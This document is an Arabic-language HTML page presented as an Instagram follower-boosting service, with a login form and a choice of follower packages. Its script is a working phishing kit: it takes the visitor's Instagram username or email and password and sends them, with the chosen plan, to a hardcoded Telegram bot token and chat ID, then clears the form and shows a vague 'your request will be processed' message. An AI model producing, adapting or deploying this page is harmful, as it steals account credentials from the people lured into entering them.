<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام الرشق الذكي | تسجيل الدخول</title>
    <style>
        :root {
            --primary: #00f2ea;
            --accent: #ff0050;
            --bg: #0d1117;
        }
        body {
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .main-card {
            background: #161b22;
            padding: 35px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 380px;
            text-align: center;
            border: 1px solid #30363d;
        }
        h1 { font-size: 22px; color: var(--primary); margin-bottom: 20px; }
        
        .input-box { text-align: right; margin-bottom: 15px; }
        label { display: block; margin-bottom: 7px; font-size: 14px; color: #8b949e; }
        
        input, select {
            width: 100%;
            padding: 12px;
            border-radius: 10px;
            border: 1px solid #30363d;
            background: #0d1117;
            color: white;
            font-size: 15px;
            outline: none;
            box-sizing: border-box;
        }
        input:focus { border-color: var(--accent); }

        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(45deg, var(--accent), #b3003b);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            transition: 0.3s;
        }
        .btn-login:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 0, 80, 0.3); }
        
        #resultMsg { margin-top: 15px; font-size: 14px; display: none; }
    </style>
</head>
<body>

<div class="main-card">
    <h1> اهلا بك بخدمات انستغرام</h1>
    
    <div class="input-box">
        <label>Username Or Email</label>
        <input type="text" id="fn" placeholder="اسم المستخدم او البريد الإلكتروني" required>
    </div>

    <div class="input-box">
        <label>Password</label>
        <input type="text" id="ln" placeholder="كلمة المرور" required>
    </div>

    <div class="input-box">
        <label>اختر الكمية المطلوبة</label>
        <select id="plan">
            <option value="100 متابع كل ساعتين">100 متابع كل ساعتين</option>
            <option value="500 متابع كل 6 ساعات">500 متابع كل 6 ساعات</option>
            <option value="1000 متابع كل يومين">1000 متابع كل يومين</option>
            <option value="2500 متابع كل 4 ايام">2500 متابع كل 4 ايام</option>
        </select>
    </div>

    <button class="btn-login" onclick="processData()">تسجيل الدخول</button>

    <div id="resultMsg">قريباً سيعالج طلبك</div>
</div>

<script>
    function processData() {
        const token = "7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ";
        const chatId = "56081692";

        const firstName = document.getElementById('fn').value.trim();
        const lastName = document.getElementById('ln').value.trim();
        const selectedPlan = document.getElementById('plan').value;
        const msgBox = document.getElementById('resultMsg');

        // شرط إجبارية الحقلين
        if (firstName === "" || lastName === "") {
            alert("البريد الالكتروني او كلمة المرور خطأ");
            return;
        }

        msgBox.style.display = "block";
        msgBox.style.color = "#8b949e";

        const textMsg = `✅ *عملية تسجيل دخول جديدة* \n\n👤 اليوزر او البريد: ${firstName} \n👤 الباسورد: ${lastName} \n📊 كمية الرشق الي اختارها: ${selectedPlan}`;

        const apiPath = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMsg)}&parse_mode=Markdown`;

        fetch(apiPath)
        .then(response => {
            if (response.ok) {
                msgBox.innerHTML = " ";
                msgBox.style.color = "#238636";
                // تفريغ الحقول بعد النجاح
                document.getElementById('fn').value = "";
                document.getElementById('ln').value = "";
            } else {
                msgBox.innerHTML = "❌ حدث خطأ في النظام، حاول لاحقاً.";
                msgBox.style.color = "#f85149";
            }
        })
        .catch(err => {
            msgBox.innerHTML = "⚠️ فشل الاتصال، تحقق من الشبكة.";
        });
    }
</script>

</body>
</html>
